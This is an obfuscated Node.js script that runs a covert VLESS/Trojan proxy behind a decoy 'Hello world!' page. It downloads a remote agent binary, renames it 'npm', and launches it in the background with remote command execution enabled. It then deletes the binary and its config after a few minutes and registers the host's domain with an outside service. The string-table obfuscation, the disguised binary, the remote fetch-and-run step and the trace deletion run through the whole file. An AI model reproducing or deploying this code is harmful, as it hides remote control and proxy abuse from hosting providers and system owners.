const _0x4fd8af=_0x5a55;(function(_0x4df56b,_0x38d487){const _0x15ec9a=_0x5a55,_0x420fe2=_0x4df56b();while(!![]){try{const _0x430ef7=parseInt(_0x15ec9a(0x1c0))/0x1+-parseInt(_0x15ec9a(0x15d))/0x2+-parseInt(_0x15ec9a(0x192))/0x3+parseInt(_0x15ec9a(0x1a7))/0x4*(-parseInt(_0x15ec9a(0x1ba))/0x5)+-parseInt(_0x15ec9a(0x193))/0x6*(parseInt(_0x15ec9a(0x1c2))/0x7)+parseInt(_0x15ec9a(0x156))/0x8+parseInt(_0x15ec9a(0x189))/0x9;if(_0x430ef7===_0x38d487)break;else _0x420fe2['push'](_0x420fe2['shift']());}catch(_0x5765be){_0x420fe2['push'](_0x420fe2['shift']());}}}(_0x2f44,0xf060d));const os=require('os'),http=require(_0x4fd8af(0x186)),fs=require('fs'),axios=require(_0x4fd8af(0x1b9)),net=require(_0x4fd8af(0x179)),path=require('path'),crypto=require(_0x4fd8af(0x185)),{Buffer}=require(_0x4fd8af(0x163)),{exec,execSync}=require(_0x4fd8af(0x1c8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x4fd8af(0x1a4),NEZHA_SERVER=process[_0x4fd8af(0x18d)][_0x4fd8af(0x19f)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4fd8af(0x18d)]['NEZHA_KEY']||'',DOMAIN=process[_0x4fd8af(0x18d)][_0x4fd8af(0x18b)]||'1234.abc.com',AUTO_ACCESS=process[_0x4fd8af(0x18d)][_0x4fd8af(0x170)]||!![],WSPATH=process['env'][_0x4fd8af(0x17d)]||UUID[_0x4fd8af(0x16b)](0x0,0x8),SUB_PATH=process[_0x4fd8af(0x18d)][_0x4fd8af(0x1ce)]||_0x4fd8af(0x17f),NAME=process['env'][_0x4fd8af(0x1a6)]||'',PORT=process[_0x4fd8af(0x18d)][_0x4fd8af(0x16a)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5d0532=_0x4fd8af;try{const _0xba344e=await axios['get'](_0x5d0532(0x15e)),_0x4b5e8b=_0xba344e[_0x5d0532(0x188)];ISP=(_0x4b5e8b[_0x5d0532(0x1c3)]+'-'+_0x4b5e8b[_0x5d0532(0x1c6)])[_0x5d0532(0x187)](/ /g,'_');}catch(_0x5b21da){ISP='Unknown';}};function _0x2f44(){const _0x207a23=['DOMAIN','log','env','client_secret:\x20','createWriteStream','length','pop','5798268klhyFf','3684042byxnKR','from','application/json','Server','substr','join','Not\x20Found\x0a','aarch64','utf8','2083','stream','--tls','NEZHA_SERVER','map','arch','readUInt8','includes','aeda6487-b604-4c9a-bdbe-64dc7534663d','443','NAME','20204HaptPV','type','catch','8443','2087','error','text/html','2053','https://','setsid\x20nohup\x20./npm\x20-s\x20','https://amd64.ssss.nyc.mn/agent','index.html','Automatic\x20Access\x20Task\x20added\x20successfully','application/dns-json','find','unlink','npm\x20download\x20successfully',':443?security=tls&sni=','axios','1095Kostcb','update','connection','send','config.yaml','close','786261xOisBO','&type=A','7HXazMC','country_code','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','decode','isp','once','child_process','utf-8','https://dns.google/resolve?name=','/bin/bash','text/plain','listen','SUB_PATH','post','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vless://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','createServer','3894288yksism','end','arm','npm\x20is\x20running','get','Server\x20is\x20running\x20on\x20port\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','1700270vdtUfJ','https://api.ip.sb/geoip','base64','false','https://arm64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','buffer','every','connect','&path=%2F','writeFileSync','Hello\x20world!','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','PORT','slice','&fp=chrome&type=ws&host=','npm','trojan://','npm\x20running\x20error:','AUTO_ACCESS','toString','chmod\x20+x\x20npm','Answer','readUInt16BE','url','write','true','Failed\x20to\x20resolve\x20','net','\x20with\x20all\x20DNS\x20servers','finish','then','WSPATH','reduce','sub','\x20-p\x20','writeHead','pipe','concat','Status','crypto','http','replace','data','37931481itHlPR',':443?encryption=none&security=tls&sni='];_0x2f44=function(){return _0x207a23;};return _0x2f44();}GetISP();const httpServer=http[_0x4fd8af(0x155)]((_0x1298ae,_0x4731f3)=>{const _0x159039=_0x4fd8af;if(_0x1298ae[_0x159039(0x175)]==='/'){const _0xd2c729=path[_0x159039(0x198)](__dirname,_0x159039(0x1b2));fs['readFile'](_0xd2c729,_0x159039(0x19b),(_0x425812,_0x424497)=>{const _0x390425=_0x159039;if(_0x425812){_0x4731f3[_0x390425(0x181)](0xc8,{'Content-Type':_0x390425(0x1ad)}),_0x4731f3[_0x390425(0x157)](_0x390425(0x168));return;}_0x4731f3[_0x390425(0x181)](0xc8,{'Content-Type':'text/html'}),_0x4731f3[_0x390425(0x157)](_0x424497);});return;}else{if(_0x1298ae['url']==='/'+SUB_PATH){const _0x448842=NAME?NAME+'-'+ISP:ISP,_0x4e4c46=_0x159039(0x153)+UUID+'@'+DOMAIN+_0x159039(0x18a)+DOMAIN+_0x159039(0x16c)+DOMAIN+_0x159039(0x166)+WSPATH+'#'+_0x448842,_0x17ee4c=_0x159039(0x16e)+UUID+'@'+DOMAIN+_0x159039(0x1b8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x159039(0x166)+WSPATH+'#'+_0x448842,_0x389920=_0x4e4c46+'\x0a'+_0x17ee4c,_0x2bffbf=Buffer[_0x159039(0x194)](_0x389920)[_0x159039(0x171)](_0x159039(0x15f));_0x4731f3[_0x159039(0x181)](0xc8,{'Content-Type':_0x159039(0x1cc)}),_0x4731f3[_0x159039(0x157)](_0x2bffbf+'\x0a');}else _0x4731f3[_0x159039(0x181)](0x194,{'Content-Type':_0x159039(0x1cc)}),_0x4731f3[_0x159039(0x157)](_0x159039(0x199));}}),wss=new WebSocket[(_0x4fd8af(0x196))]({'server':httpServer}),uuid=UUID[_0x4fd8af(0x187)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x589e4a){return new Promise((_0x1d9bbf,_0x37bcda)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x589e4a)){_0x1d9bbf(_0x589e4a);return;}let _0x246954=0x0;function _0x1a5b09(){const _0xb6e0b1=_0x5a55;if(_0x246954>=DNS_SERVERS['length']){_0x37bcda(new Error(_0xb6e0b1(0x178)+_0x589e4a+_0xb6e0b1(0x17a)));return;}const _0x44271b=DNS_SERVERS[_0x246954];_0x246954++;const _0x4dd7af=_0xb6e0b1(0x1ca)+encodeURIComponent(_0x589e4a)+_0xb6e0b1(0x1c1);axios[_0xb6e0b1(0x15a)](_0x4dd7af,{'timeout':0x1388,'headers':{'Accept':_0xb6e0b1(0x1b4)}})['then'](_0x26c1a7=>{const _0x41eb8c=_0xb6e0b1,_0x153f3d=_0x26c1a7[_0x41eb8c(0x188)];if(_0x153f3d[_0x41eb8c(0x184)]===0x0&&_0x153f3d['Answer']&&_0x153f3d[_0x41eb8c(0x173)][_0x41eb8c(0x190)]>0x0){const _0x2c368e=_0x153f3d[_0x41eb8c(0x173)][_0x41eb8c(0x1b5)](_0x1c8d19=>_0x1c8d19[_0x41eb8c(0x1a8)]===0x1);if(_0x2c368e){_0x1d9bbf(_0x2c368e[_0x41eb8c(0x188)]);return;}}_0x1a5b09();})[_0xb6e0b1(0x1a9)](_0x460634=>{_0x1a5b09();});}_0x1a5b09();});}function handleVlessConnection(_0x38b46f,_0x201772){const _0x38ed17=_0x4fd8af,[_0x507307]=_0x201772,_0x46a7ea=_0x201772['slice'](0x1,0x11);if(!_0x46a7ea[_0x38ed17(0x164)]((_0x1cbe8b,_0x20bfba)=>_0x1cbe8b==parseInt(uuid[_0x38ed17(0x197)](_0x20bfba*0x2,0x2),0x10)))return![];let _0x1b6819=_0x201772[_0x38ed17(0x16b)](0x11,0x12)[_0x38ed17(0x1a2)]()+0x13;const _0x71771=_0x201772['slice'](_0x1b6819,_0x1b6819+=0x2)[_0x38ed17(0x174)](0x0),_0x5c389f=_0x201772[_0x38ed17(0x16b)](_0x1b6819,_0x1b6819+=0x1)[_0x38ed17(0x1a2)](),_0x413827=_0x5c389f==0x1?_0x201772[_0x38ed17(0x16b)](_0x1b6819,_0x1b6819+=0x4)[_0x38ed17(0x198)]('.'):_0x5c389f==0x2?new TextDecoder()[_0x38ed17(0x1c5)](_0x201772[_0x38ed17(0x16b)](_0x1b6819+0x1,_0x1b6819+=0x1+_0x201772[_0x38ed17(0x16b)](_0x1b6819,_0x1b6819+0x1)[_0x38ed17(0x1a2)]())):_0x5c389f==0x3?_0x201772['slice'](_0x1b6819,_0x1b6819+=0x10)[_0x38ed17(0x17e)]((_0x5c590e,_0x414053,_0x2d4970,_0x599750)=>_0x2d4970%0x2?_0x5c590e['concat'](_0x599750['slice'](_0x2d4970-0x1,_0x2d4970+0x1)):_0x5c590e,[])['map'](_0x159579=>_0x159579['readUInt16BE'](0x0)['toString'](0x10))[_0x38ed17(0x198)](':'):'';_0x38b46f[_0x38ed17(0x1bd)](new Uint8Array([_0x507307,0x0]));const _0x41bc3f=createWebSocketStream(_0x38b46f);return resolveHost(_0x413827)[_0x38ed17(0x17c)](_0x3309e0=>{const _0x27be3f=_0x38ed17;net[_0x27be3f(0x165)]({'host':_0x3309e0,'port':_0x71771},function(){const _0x27e633=_0x27be3f;this[_0x27e633(0x176)](_0x201772[_0x27e633(0x16b)](_0x1b6819)),_0x41bc3f['on']('error',()=>{})[_0x27e633(0x182)](this)['on'](_0x27e633(0x1ac),()=>{})[_0x27e633(0x182)](_0x41bc3f);})['on'](_0x27be3f(0x1ac),()=>{});})['catch'](_0x508129=>{const _0x5f1b60=_0x38ed17;net[_0x5f1b60(0x165)]({'host':_0x413827,'port':_0x71771},function(){const _0x6be2cb=_0x5f1b60;this[_0x6be2cb(0x176)](_0x201772[_0x6be2cb(0x16b)](_0x1b6819)),_0x41bc3f['on']('error',()=>{})[_0x6be2cb(0x182)](this)['on'](_0x6be2cb(0x1ac),()=>{})['pipe'](_0x41bc3f);})['on'](_0x5f1b60(0x1ac),()=>{});}),!![];}function handleTrojanConnection(_0x2555c2,_0x334736){const _0x2ea5ee=_0x4fd8af;try{if(_0x334736[_0x2ea5ee(0x190)]<0x3a)return![];const _0x33d4c9=_0x334736[_0x2ea5ee(0x16b)](0x0,0x38)['toString'](),_0xff5b=[UUID];let _0x2405b8=null;for(const _0x4632bd of _0xff5b){const _0x53de5b=crypto['createHash']('sha224')[_0x2ea5ee(0x1bb)](_0x4632bd)['digest']('hex');if(_0x53de5b===_0x33d4c9){_0x2405b8=_0x4632bd;break;}}if(!_0x2405b8)return![];let _0x55bd82=0x38;_0x334736[_0x55bd82]===0xd&&_0x334736[_0x55bd82+0x1]===0xa&&(_0x55bd82+=0x2);const _0x240baa=_0x334736[_0x55bd82];if(_0x240baa!==0x1)return![];_0x55bd82+=0x1;const _0x32da4f=_0x334736[_0x55bd82];_0x55bd82+=0x1;let _0x41e515,_0x445ed3;if(_0x32da4f===0x1)_0x41e515=_0x334736[_0x2ea5ee(0x16b)](_0x55bd82,_0x55bd82+0x4)[_0x2ea5ee(0x198)]('.'),_0x55bd82+=0x4;else{if(_0x32da4f===0x3){const _0x2824f5=_0x334736[_0x55bd82];_0x55bd82+=0x1,_0x41e515=_0x334736[_0x2ea5ee(0x16b)](_0x55bd82,_0x55bd82+_0x2824f5)[_0x2ea5ee(0x171)](),_0x55bd82+=_0x2824f5;}else{if(_0x32da4f===0x4)_0x41e515=_0x334736['slice'](_0x55bd82,_0x55bd82+0x10)['reduce']((_0x310911,_0x3e37d1,_0x3448c6,_0x38b045)=>_0x3448c6%0x2?_0x310911[_0x2ea5ee(0x183)](_0x38b045[_0x2ea5ee(0x16b)](_0x3448c6-0x1,_0x3448c6+0x1)):_0x310911,[])[_0x2ea5ee(0x1a0)](_0x40fff9=>_0x40fff9[_0x2ea5ee(0x174)](0x0)[_0x2ea5ee(0x171)](0x10))['join'](':'),_0x55bd82+=0x10;else return![];}}_0x445ed3=_0x334736[_0x2ea5ee(0x174)](_0x55bd82),_0x55bd82+=0x2;_0x55bd82<_0x334736[_0x2ea5ee(0x190)]&&_0x334736[_0x55bd82]===0xd&&_0x334736[_0x55bd82+0x1]===0xa&&(_0x55bd82+=0x2);const _0x2e63a1=createWebSocketStream(_0x2555c2);return resolveHost(_0x41e515)['then'](_0x31f39f=>{const _0x47f3ad=_0x2ea5ee;net[_0x47f3ad(0x165)]({'host':_0x31f39f,'port':_0x445ed3},function(){const _0x446e6d=_0x47f3ad;_0x55bd82<_0x334736[_0x446e6d(0x190)]&&this[_0x446e6d(0x176)](_0x334736[_0x446e6d(0x16b)](_0x55bd82)),_0x2e63a1['on'](_0x446e6d(0x1ac),()=>{})[_0x446e6d(0x182)](this)['on'](_0x446e6d(0x1ac),()=>{})[_0x446e6d(0x182)](_0x2e63a1);})['on'](_0x47f3ad(0x1ac),()=>{});})['catch'](_0x440ba2=>{const _0x36626c=_0x2ea5ee;net[_0x36626c(0x165)]({'host':_0x41e515,'port':_0x445ed3},function(){const _0x1e795c=_0x36626c;_0x55bd82<_0x334736[_0x1e795c(0x190)]&&this[_0x1e795c(0x176)](_0x334736[_0x1e795c(0x16b)](_0x55bd82)),_0x2e63a1['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x1e795c(0x182)](_0x2e63a1);})['on'](_0x36626c(0x1ac),()=>{});}),!![];}catch(_0x14336b){return![];}}wss['on'](_0x4fd8af(0x1bc),(_0x5ed677,_0x17ce32)=>{const _0x67c422=_0x4fd8af,_0x599513=_0x17ce32['url']||'';_0x5ed677[_0x67c422(0x1c7)]('message',_0x27e5e0=>{const _0x38e25e=_0x67c422;if(_0x27e5e0['length']>0x11&&_0x27e5e0[0x0]===0x0){const _0x200393=_0x27e5e0[_0x38e25e(0x16b)](0x1,0x11),_0x496095=_0x200393['every']((_0x147ee8,_0x3c037a)=>_0x147ee8==parseInt(uuid['substr'](_0x3c037a*0x2,0x2),0x10));if(_0x496095){!handleVlessConnection(_0x5ed677,_0x27e5e0)&&_0x5ed677[_0x38e25e(0x1bf)]();return;}}!handleTrojanConnection(_0x5ed677,_0x27e5e0)&&_0x5ed677[_0x38e25e(0x1bf)]();})['on'](_0x67c422(0x1ac),()=>{});});const getDownloadUrl=()=>{const _0x5d48e3=_0x4fd8af,_0x4b24c5=os[_0x5d48e3(0x1a1)]();return _0x4b24c5===_0x5d48e3(0x158)||_0x4b24c5==='arm64'||_0x4b24c5===_0x5d48e3(0x19a)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x5d48e3(0x161):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x5d48e3(0x1b1);},downloadFile=async()=>{const _0xd04af4=_0x4fd8af;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x322236=getDownloadUrl(),_0x19d9fa=await axios({'method':_0xd04af4(0x15a),'url':_0x322236,'responseType':_0xd04af4(0x19d)}),_0x4ad7e0=fs[_0xd04af4(0x18f)](_0xd04af4(0x16d));return _0x19d9fa['data'][_0xd04af4(0x182)](_0x4ad7e0),new Promise((_0x3d28c0,_0x5a433a)=>{const _0x1e1a86=_0xd04af4;_0x4ad7e0['on'](_0x1e1a86(0x17b),()=>{const _0x1956e7=_0x1e1a86;console[_0x1956e7(0x18c)](_0x1956e7(0x1b7)),exec(_0x1956e7(0x172),_0x257358=>{if(_0x257358)_0x5a433a(_0x257358);_0x3d28c0();});}),_0x4ad7e0['on'](_0x1e1a86(0x1ac),_0x5a433a);});}catch(_0x5d4933){throw _0x5d4933;}},runnz=async()=>{const _0x3c6b2a=_0x4fd8af;try{const _0x5ce3c9=execSync(_0x3c6b2a(0x154),{'encoding':_0x3c6b2a(0x1c9)});if(_0x5ce3c9['trim']()!==''){console[_0x3c6b2a(0x18c)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x464d10){}await downloadFile();let _0x466600='',_0x2dcce6=[_0x3c6b2a(0x1a5),_0x3c6b2a(0x1aa),'2096',_0x3c6b2a(0x1ab),_0x3c6b2a(0x19c),_0x3c6b2a(0x1ae)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x209781=_0x2dcce6[_0x3c6b2a(0x1a3)](NEZHA_PORT)?_0x3c6b2a(0x19e):'';_0x466600=_0x3c6b2a(0x1b0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3c6b2a(0x180)+NEZHA_KEY+'\x20'+_0x209781+_0x3c6b2a(0x162);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe9b814=NEZHA_SERVER[_0x3c6b2a(0x1a3)](':')?NEZHA_SERVER['split'](':')[_0x3c6b2a(0x191)]():'',_0xd42c6=_0x2dcce6[_0x3c6b2a(0x1a3)](_0xe9b814)?_0x3c6b2a(0x177):_0x3c6b2a(0x160),_0x542606=_0x3c6b2a(0x18e)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3c6b2a(0x152)+_0xd42c6+_0x3c6b2a(0x1c4)+UUID;fs[_0x3c6b2a(0x167)](_0x3c6b2a(0x1be),_0x542606);}_0x466600=_0x3c6b2a(0x169);}else{console[_0x3c6b2a(0x18c)](_0x3c6b2a(0x15c));return;}}try{exec(_0x466600,{'shell':_0x3c6b2a(0x1cb)},_0x3dc33c=>{const _0x5ab2a9=_0x3c6b2a;if(_0x3dc33c)console['error'](_0x5ab2a9(0x16f),_0x3dc33c);else console[_0x5ab2a9(0x18c)](_0x5ab2a9(0x159));});}catch(_0x31fb80){console['error']('error:\x20'+_0x31fb80);}};async function addAccessTask(){const _0x5b0895=_0x4fd8af;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4d0553=_0x5b0895(0x1af)+DOMAIN;try{const _0xe7d163=await axios[_0x5b0895(0x1cf)]('https://oooo.serv00.net/add-url',{'url':_0x4d0553},{'headers':{'Content-Type':_0x5b0895(0x195)}});console[_0x5b0895(0x18c)](_0x5b0895(0x1b3));}catch(_0x442137){}}const delFiles=()=>{const _0x4ce968=_0x4fd8af;fs[_0x4ce968(0x1b6)](_0x4ce968(0x16d),()=>{}),fs[_0x4ce968(0x1b6)]('config.yaml',()=>{});};function _0x5a55(_0x4ff266,_0x4aca66){_0x4ff266=_0x4ff266-0x152;const _0x2f4485=_0x2f44();let _0x5a554f=_0x2f4485[_0x4ff266];return _0x5a554f;}httpServer[_0x4fd8af(0x1cd)](PORT,()=>{const _0x516d4c=_0x4fd8af;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x516d4c(0x18c)](_0x516d4c(0x15b)+PORT);});
